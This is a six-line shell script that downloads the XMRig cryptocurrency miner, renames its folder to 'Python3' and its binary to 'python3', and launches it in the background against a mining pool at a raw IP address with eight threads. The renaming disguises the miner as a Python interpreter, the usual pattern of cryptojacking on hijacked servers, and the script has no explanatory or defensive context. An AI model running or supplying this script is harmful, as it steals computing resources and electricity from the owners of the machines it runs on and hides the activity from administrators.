wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -zxf xmrig-6.18.0-linux-x64.tar.gz 
rm xmrig-6.18.0-linux-x64.tar.gz
mv xmrig-6.18.0 Python3 
cd Python3 
mv xmrig python3 
./python3 --donate-level 0 -o 47.250.38.10:5301 -u MINER -p x -k -a rx/0 --threads=8 -B
